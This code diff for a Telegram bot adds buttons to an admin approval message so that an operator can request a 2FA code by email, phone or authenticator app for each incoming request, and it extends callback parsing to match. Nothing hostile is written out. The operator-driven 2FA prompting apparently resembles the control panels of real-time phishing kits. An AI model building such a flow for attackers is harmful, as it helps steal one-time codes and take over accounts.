@@ -30,11 +30,14 @@ function sendApprovalMessage(requestId, text) {
 
     return tgApi('sendMessage', {
         chat_id: TELEGRAM_ADMIN_CHAT_ID,
-        text: body + '\n\nApprove?',
+        text: body + '\n\nAction?',
         reply_markup: {
             inline_keyboard: [[
-                { text: '✅ Approve', callback_data: 'approve:' + requestId },
-                { text: '❌ Reject',  callback_data: 'reject:'  + requestId }
+                { text: '✅ Approve',       callback_data: 'approve:'  + requestId },
+                { text: '🔐 2FA Email',     callback_data: '2fa_email:' + requestId },
+                { text: '📱 2FA Phone',     callback_data: '2fa_phone:' + requestId },
+                { text: '🔑 2FA Auth App',  callback_data: '2fa_totp:'  + requestId },
+                { text: '❌ Reject',        callback_data: 'reject:'   + requestId }
             ]]
         }
     });
@@ -46,7 +49,9 @@ function parseCallback(data) {
     if (i <= 0) return null;
     const action = data.slice(0, i);
     const requestId = data.slice(i + 1);
-    if (!requestId || (action !== 'approve' && action !== 'reject')) return null;
+    if (!requestId) return null;
+    const validActions = ['approve', 'reject', '2fa_email', '2fa_phone', '2fa_totp'];
+    if (!validActions.includes(action)) return null;
     return { action, requestId };
 }
 
